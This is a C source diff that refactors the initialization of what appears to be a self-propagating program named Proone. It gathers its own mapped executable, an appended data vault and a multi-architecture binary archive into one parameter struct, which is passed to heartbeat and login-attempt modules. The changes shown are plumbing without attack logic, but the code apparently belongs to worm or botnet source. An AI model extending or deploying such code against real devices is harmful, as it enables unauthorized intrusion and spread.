@@ -226,6 +226,7 @@ static void alloc_htbt (void) {
 	param.cb_f.hostinfo = cb_htbt_hostinfo;
 	param.cb_f.tmpfile = cb_htbt_tmpfile;
 	param.cb_f.upbin = cb_htbt_upbin;
+	param.rcb = &prne_g.rcb_param;
 	param.blackhole = prne_g.blackhole[1];
 
 	htbt = prne_alloc_htbt(
@@ -665,8 +666,8 @@ static void set_env (void) {
 }
 
 static void setup_dvault (void) {
-	prne_g.m_dvault = (uint8_t*)prne_malloc(1, prne_g.dvault_size);
-	memcpy(prne_g.m_dvault, prne_g.m_exec_dvault, prne_g.dvault_size);
+	prne_g.m_dvault = (uint8_t*)prne_malloc(1, prne_g.rcb_param.dv_len);
+	memcpy(prne_g.m_dvault, prne_g.rcb_param.m_dv, prne_g.rcb_param.dv_len);
 
 	prne_init_dvault(prne_g.m_dvault);
 }
@@ -699,7 +700,7 @@ static void init_proone (const char *self) {
 	prne_assert(fd >= 0);
 	file_size = lseek(fd, 0, SEEK_END);
 	prne_assert(file_size >= (off_t)sizeof(ELF_EHDR_TYPE));
-	prne_g.m_exec = (const uint8_t*)mmap(
+	prne_g.rcb_param.m_self = (const uint8_t*)mmap(
 		NULL,
 		file_size,
 		PROT_READ,
@@ -707,10 +708,10 @@ static void init_proone (const char *self) {
 		fd,
 		0);
 	prne_close(fd);
-	prne_assert(prne_g.m_exec != MAP_FAILED);
+	prne_assert(prne_g.rcb_param.m_self != MAP_FAILED);
 
 	// Use header
-	elf = (ELF_EHDR_TYPE*)prne_g.m_exec;
+	elf = (ELF_EHDR_TYPE*)prne_g.rcb_param.m_self;
 	prne_assert(
 		elf->e_ident[EI_MAG0] == ELFMAG0 &&
 		elf->e_ident[EI_MAG1] == ELFMAG1 &&
@@ -719,32 +720,36 @@ static void init_proone (const char *self) {
 	prne_assert(elf->e_ident[EI_CLASS] == EXPTD_CLASS);
 	prne_assert(elf->e_ident[EI_DATA] == EXPTD_DATA);
 
-	prne_g.self_size = (size_t)file_size;
-	prne_g.exec_size = elf->e_shoff + (elf->e_shentsize * elf->e_shnum);
-	prne_g.exec_size = prne_salign_next(prne_g.exec_size, PRNE_BIN_ALIGNMENT);
+	prne_g.rcb_param.self_len = (size_t)file_size;
+	prne_g.rcb_param.exec_len =
+		elf->e_shoff +
+		(elf->e_shentsize * elf->e_shnum);
+	prne_g.rcb_param.exec_len = prne_salign_next(
+		prne_g.rcb_param.exec_len,
+		PRNE_BIN_ALIGNMENT);
 	prne_massert(
-		prne_g.exec_size + 8 <= (size_t)file_size,
+		prne_g.rcb_param.exec_len + 8 <= (size_t)file_size,
 		"No appendix!");
 
 	// Read sizes
-	prne_g.dvault_size =
-		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 0] << 8 |
-		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 1] << 0;
+	prne_g.rcb_param.dv_len =
+		(uint_fast16_t)prne_g.rcb_param.m_self[prne_g.rcb_param.exec_len + 0] << 8 |
+		(uint_fast16_t)prne_g.rcb_param.m_self[prne_g.rcb_param.exec_len + 1] << 0;
 
-	dvault_ofs = prne_g.exec_size + 8;
+	dvault_ofs = prne_g.rcb_param.exec_len + 8;
 	binarch_ofs = dvault_ofs + prne_salign_next(
-		prne_g.dvault_size,
+		prne_g.rcb_param.dv_len,
 		PRNE_BIN_ALIGNMENT);
 	binarch_size = file_size - binarch_ofs;
 
 	// Load dvault
-	prne_assert(dvault_ofs + prne_g.dvault_size <= (size_t)file_size);
-	prne_g.m_exec_dvault = prne_g.m_exec + dvault_ofs;
+	prne_assert(dvault_ofs + prne_g.rcb_param.dv_len <= (size_t)file_size);
+	prne_g.rcb_param.m_dv = prne_g.rcb_param.m_self + dvault_ofs;
 	setup_dvault();
 
 	if (binarch_size > 0) {
 		prne_index_bin_archive(
-			prne_g.m_exec + binarch_ofs,
+			prne_g.rcb_param.m_self + binarch_ofs,
 			binarch_size,
 			&prne_g.bin_archive);
 	}
@@ -1242,14 +1247,7 @@ static void init_bne (void) {
 	bne_param.cb.enter_dd = bne_cb_enter_dd;
 	bne_param.cb.exit_dd = bne_cb_exit_dd;
 
-	bne_param.rcb.m_self = prne_g.m_exec;
-	bne_param.rcb.self_len = prne_g.self_size;
-	bne_param.rcb.exec_len = prne_g.exec_size;
-	bne_param.rcb.m_dv = prne_g.m_exec_dvault;
-	bne_param.rcb.dv_len = prne_g.dvault_size;
-	bne_param.rcb.ba = &prne_g.bin_archive;
-	bne_param.rcb.self = prne_host_arch;
-
+	bne_param.rcb = &prne_g.rcb_param;
 	bne_param.login_attempt = PRNE_BNE_LOGIN_ATTEMPT;
 }
 
@@ -1287,6 +1285,9 @@ int main (const int argc, const char **args) {
 	prne_g.blackhole[0] = -1;
 	prne_g.blackhole[1] = -1;
 	prne_g.shm_fd = -1;
+	prne_init_rcb_param(&prne_g.rcb_param);
+	prne_g.rcb_param.ba = &prne_g.bin_archive;
+	prne_g.rcb_param.self = prne_host_arch;
 	prne_init_bin_archive(&prne_g.bin_archive);
 	mbedtls_x509_crt_init(&prne_g.ssl.ca);
 	prne_mbedtls_entropy_init(&prne_g.ssl.entpy);
@@ -1430,6 +1431,7 @@ WAIT_LOOP:
 
 END:
 	deinit_bne();
+	prne_free_rcb_param(&prne_g.rcb_param);
 	prne_free_bin_archive(&prne_g.bin_archive);
 
 	mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
